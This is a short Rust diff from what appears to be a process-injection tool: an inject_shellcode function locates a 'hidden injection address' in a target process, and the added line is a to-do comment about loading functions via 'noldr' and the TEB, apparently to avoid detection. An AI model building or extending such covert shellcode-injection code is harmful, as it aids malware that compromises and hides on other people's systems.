@@ -33,6 +33,8 @@ pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), Stri
 
     let shellcode_size = shellcode.len();
 
+    //YOU ARE HERE. need to pass the teb to get_hidden_injection_address and use noldr to load our functions instead of using the crate
+
     let shellcode_location = func::get_hidden_injection_address(process_handle, shellcode_size)
         .map_err(|e| format!("Failed to get injection address: {}", e))?;
 
